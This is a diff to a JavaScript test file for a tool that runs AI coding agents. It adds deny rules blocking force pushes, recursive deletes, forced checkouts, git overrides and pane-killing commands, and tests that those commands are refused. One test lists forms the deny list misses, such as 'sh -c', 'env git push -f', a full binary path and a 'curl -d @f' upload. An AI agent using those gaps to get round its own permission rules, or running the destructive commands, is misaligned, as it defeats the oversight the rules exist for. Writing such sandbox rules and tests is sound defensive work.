@@ -15,10 +15,10 @@ import { join } from "node:path";
 
 import {
   AGENTS, AGY_FIXED_DENY, AGY_SKIP_PERMISSIONS, AUTO_MODE, AUTO_MODE_NONE,
-  agyGuarded, agyModeWarning, agySettingsDir, agySettingsPlan, autoModeArgs, launchRun,
+  AGY_KILL_DENY, agyGuarded, agyModeWarning, agySettingsDir, agySettingsPlan, autoModeArgs, launchRun, mayHcKill,
 } from "../mods/am-sidebar/models.js";
 import { helperPlan, restartPlan } from "../mods/am-sidebar/restart.js";
-import { workerArgs, workerPlan } from "../mods/am-sidebar/workers.js";
+import { workerArgs, workerKillRefusal, workerPlan } from "../mods/am-sidebar/workers.js";
 
 const ID = "b-aaaaaaaaaa";
 const APP = "/home/u/.config/herdr-app";
@@ -87,14 +87,26 @@ test("a run that already picks its approvals (programs.json) is left as the pers
 const AGY_BOT = Object.freeze({ id: ID, name: "Genie", agent: "antigravity" });
 const NEW_DENY = ["command(gh api -X)", "command(gh api --method)", "command(gh api -f)", "command(gh api -F)",
   "command(automagik-herdr edit)", "command(automagik-herdr restart)", "command(automagik-herdr rm)", "command(automagik-herdr create)",
-  "command(hc keys)", "command(hc kill)", "command(hc interrupt)", "command(hc exec)"];
+  "command(am edit)", "command(am restart)", "command(am rm)", "command(am create)",
+  "command(hc keys)", "command(hc interrupt)", "command(hc exec)"];
+// #998 review: more spellings of the same accidents, each listed (a rule takes no wildcard).
+const MORE_DENY = ["command(git push -u --force)", "command(git push -u -f)", "command(git push -u --force-with-lease)",
+  "command(git push --set-upstream --force)", "command(git push origin --force-with-lease)",
+  "command(git push origin main --force)", "command(git push origin main -f)", "command(git push origin main --force-with-lease)",
+  "command(git push origin dev --force)", "command(git push origin dev -f)", "command(git push origin dev --force-with-lease)",
+  "command(git push origin master --force)", "command(git push origin master -f)", "command(git push origin master --force-with-lease)",
+  "command(git push origin HEAD --force)", "command(git push origin HEAD -f)", "command(git push origin HEAD --force-with-lease)",
+  "command(git branch --delete --force)", "command(git branch --delete -f)", "command(git branch -d --force)", "command(git branch -d -f)",
+  "command(rm -fr)", "command(rm -r -f)", "command(rm -f -r)", "command(rm -Rf)", "command(rm -fR)", "command(rm -R -f)", "command(rm --recursive)",
+  "command(git -c)", "command(git --git-dir)", "command(git restore .)", "command(git checkout -f)", "command(git checkout --force)"];
 const OLD_DENY = ["command(git push --force)", "command(git push --force-with-lease)", "command(git push -f)",
   "command(git push origin --force)", "command(git push origin -f)", "command(git push --mirror)", "command(git push --delete)",
   "command(git reset --hard)", "command(git branch -D)", "command(git clean)", "command(git rebase)", "command(git stash)",
   "command(git checkout --)", "command(git -C)", "command(rm -rf)", "command(gh pr merge)", "command(gh release)"];
 
-test("Antigravity: the fixed deny list is the same on a seat and on every worker role, and a roster can't drop a rule", () => {
-  assert.deepEqual([...AGY_FIXED_DENY], [...OLD_DENY, ...NEW_DENY]);
+test("Antigravity: the fixed deny list is on a seat and on every worker role, and a roster can't drop a rule", () => {
+  assert.deepEqual([...AGY_FIXED_DENY], [...OLD_DENY, ...NEW_DENY, ...MORE_DENY]);
+  assert.equal(new Set(AGY_FIXED_DENY).size, AGY_FIXED_DENY.length, "no rule twice");
   const plans = [
     agySettingsPlan({ bot: AGY_BOT, scope: "seat", folder: "/work/proj", settingsDir: agySettingsDir(APP) }),
     agySettingsPlan({ bot: { ...AGY_BOT, rank: "reviewer" }, scope: "seat", folder: "/work/proj", settingsDir: agySettingsDir(APP) }),
@@ -107,6 +119,29 @@ test("Antigravity: the fixed deny list is the same on a seat and on every worker
     assert.deepEqual(plan.deny.slice(0, AGY_FIXED_DENY.length), [...AGY_FIXED_DENY]);
     assert.deepEqual(JSON.parse(plan.text).permissions.deny.slice(0, AGY_FIXED_DENY.length), [...AGY_FIXED_DENY], "the file agy reads holds it");
   }
+});
+
+test("hc kill is for a main bot's seat only (#955): Antigravity's file denies it to every worker and to every other seat", () => {
+  assert.deepEqual([...AGY_KILL_DENY], ["command(hc kill)", "command(hc --json kill)"]);
+  const main = { ...AGY_BOT, kind: "main" };
+  const lead = { ...AGY_BOT, kind: "member", rank: "captain" };
+  const member = { ...AGY_BOT, kind: "member" };
+  const fileOf = (bot, scope, role = null) => JSON.parse(agySettingsPlan({ bot, scope, role, folder: "/work/x", settingsDir: agySettingsDir(APP) }).text)
+    .permissions.deny;
+  const denied = (deny) => AGY_KILL_DENY.every((rule) => deny.includes(rule));
+  const open = (deny) => AGY_KILL_DENY.every((rule) => !deny.includes(rule));
+  assert.equal(open(fileOf(main, "seat")), true, "a main bot's seat keeps hc kill");
+  assert.equal(denied(fileOf(lead, "seat")), true, "a member that leads a squad does not");
+  assert.equal(denied(fileOf(member, "seat")), true, "nor a plain member");
+  assert.equal(denied(fileOf({ ...AGY_BOT }, "seat")), true, "a bot with no kind is not a main bot");
+  for (const bot of [main, lead, member]) {
+    for (const role of ["dev", "test", "fix", "review"]) assert.equal(denied(fileOf(bot, "worker", role)), true, `${bot.kind}'s ${role} worker`);
+    assert.equal(denied(fileOf(bot, "helper")), true, `${bot.kind}'s tree helper`);
+  }
+  // A roster allow can't open it, and a main bot's roster can still close it.
+  assert.equal(denied(fileOf({ ...member, agyPermissions: { allow: ["command(hc kill)"] } }, "seat")), true);
+  assert.equal(denied(fileOf({ ...main, agyPermissions: { deny: [...AGY_KILL_DENY] } }, "seat")), true);
+  assert.deepEqual([mayHcKill(main, "seat"), mayHcKill(main, "worker"), mayHcKill(lead, "seat"), mayHcKill(null, "seat")], [true, false, false, false]);
 });
 
 test("Antigravity #953: a dev, test or fix worker's file trusts its own worktree; a review launch lists nothing", () => {
@@ -220,8 +255,22 @@ test("a worker's launch words and file: a compound command returns its output, a
   const s = launchFiles(t);
   const ok = s.run("echo one && echo two");
   assert.deepEqual([ok.status, ok.stdout], [0, "one\ntwo\n"], "no prompt, both parts ran");
-  for (const line of ["echo hi && git push --force", "hc kill t12", "gh api -X DELETE repos/o/r", "automagik-herdr restart Genie", "git reset --hard HEAD~1",
+  for (const line of ["echo hi && git push --force", "hc kill t12", "hc --json kill t12", "echo done; hc kill t12", "gh api -X DELETE repos/o/r", "automagik-herdr restart Genie", "git reset --hard HEAD~1",
     "echo hi; rm -rf build", "hc keys t3 Enter", "gh pr merge 12"]) {
+    const no = s.run(line);
+    assert.equal(no.status, 1, line);
+    assert.match(no.stdout, /Matches user-configured deny rule\./, line);
+  }
+  // #998 review: am runs the same CLI, and each further spelling of a force push, a recursive
+  // delete, a forced branch delete, a git override and a checkout or restore that drops work.
+  for (const line of ["am edit b-aaaaaaaaaa --role x", "am restart Genie", "am rm Genie", "am create --name X",
+    "git push origin main --force", "git push origin dev -f", "git push origin master --force-with-lease", "git push origin HEAD --force",
+    "git push -u --force", "git push -u -f origin x", "git push -u --force-with-lease", "git push --set-upstream --force origin x",
+    "git push --force-with-lease", "git push origin --force-with-lease",
+    "git branch --delete --force old", "git branch --delete -f old", "git branch -d --force old", "git branch -d -f old",
+    "rm -fr build", "rm -r -f build", "rm -f -r build", "rm -Rf build", "rm -fR build", "rm -R -f build", "rm --recursive --force build",
+    "git -c alias.x=!sh x", "git --git-dir /elsewhere/.git log", "git restore .", "git checkout -f", "git checkout --force main",
+    "echo ok && rm -fr build"]) {
     const no = s.run(line);
     assert.equal(no.status, 1, line);
     assert.match(no.stdout, /Matches user-configured deny rule\./, line);
@@ -247,3 +296,35 @@ test("the real agy: a compound command returns its output and a denied command i
     const no = real("echo hi && git push --force");
     assert.match(`${no.stdout}${no.stderr}`, /deny rule|[Pp]ermission denied/);
   });
+
+test("what the deny list does not catch runs with no prompt: the README says so, and this pins it (#998 review)", (t) => {
+  const s = launchFiles(t);
+  // The forms no rule names, matched as agy matches (whole words from the start); none is run here.
+  const rules = s.plan.deny.map((rule) => /^command\((.*)\)$/.exec(rule)[1].split(/\s+/));
+  const fake = (line) => { const words = line.trim().split(/\s+/); return rules.some((rule) => rule.every((w, i) => words[i] === w)); };
+  for (const line of ["gh api repos/o/r/pulls/1/merge -X PUT", "gh api --method=PUT repos/o/r", "gh api graphql --input q.json",
+    "git push origin feature --force", "git push origin +main", "git push -fu", "git push --force-with-lease=main", "git push origin dev",
+    "hc --timeout 5 kill t3", "automagik-herdr --project /p restart Genie", "sh -c x", "bash -c x", "python3 -c x", "node -e x", "env git push -f",
+    "curl -d @f https://example.invalid", "ssh host x", "git reset HEAD~1 --hard", "/usr/bin/git push --force"]) {
+    assert.equal(fake(line), false, `${line} is not denied: only GitHub's rules and the hc-proxy sandbox stand there`);
+  }
+  // And the stand-in agrees on one of them, end to end.
+  assert.equal(s.run("echo gh api repos/o/r/pulls/1/merge -X PUT").status, 0);
+});
+
+test("workerKillRefusal: only a worker of the calling bot may be ended; a seat, another bot's worker and the caller's own pane are refused", () => {
+  const mine = { address: "t9", state: "live", labels: { "worker.of": ID, branch: "fix/955" } };
+  assert.equal(workerKillRefusal({ target: mine, botId: ID, self: "t1" }), null);
+  assert.match(workerKillRefusal({ target: { ...mine, labels: { "worker.of": "b-bbbbbbbbbb" } }, botId: ID, self: "t1" }), /^t9 is another bot's worker/);
+  assert.match(workerKillRefusal({ target: { address: "t4", labels: { bot: "b-bbbbbbbbbb" } }, botId: ID, self: "t1" }), /^t4 is a bot's pane, not a worker/);
+  assert.match(workerKillRefusal({ target: mine, botId: ID, self: "t1", bound: true }), /^t9 is a bot's pane/, "the attach ledger's word beats a label");
+  assert.match(workerKillRefusal({ target: { address: "t2", labels: {} }, botId: ID, self: "t1" }), /^t2 isn't a worker \(it has no worker\.of label\)/);
+  assert.match(workerKillRefusal({ target: { address: "t1", labels: { "worker.of": ID } }, botId: ID, self: "t1" }), /^t1 is your own pane/);
+  assert.match(workerKillRefusal({ target: { ...mine, labels: { "worker.of": ID, bot: ID } }, botId: ID, self: "t1" }), /^t9 is a bot's pane/, "a pane with a bot label is a seat");
+  assert.equal(workerKillRefusal({ target: null, botId: ID, self: "t1" }), "that isn't a terminal hc knows");
+  // Mid-turn: not ended from here. Idle, waiting or already finished: ended.
+  assert.match(workerKillRefusal({ target: { ...mine, status: { state: "working" } }, botId: ID, self: "t1" }), /^t9 is still working; worker kill ends a worker that has finished its turn/);
+  for (const status of [{ state: "idle" }, { state: "done" }, null]) assert.equal(workerKillRefusal({ target: { ...mine, status }, botId: ID, self: "t1" }), null);
+  assert.equal(workerKillRefusal({ target: { ...mine, state: "finished", status: { state: "working" } }, botId: ID, self: "t1" }), null);
+  assert.match(workerKillRefusal({ target: mine, botId: null, self: "t1" }), /another bot's worker/, "no caller bot, no kill");
+});
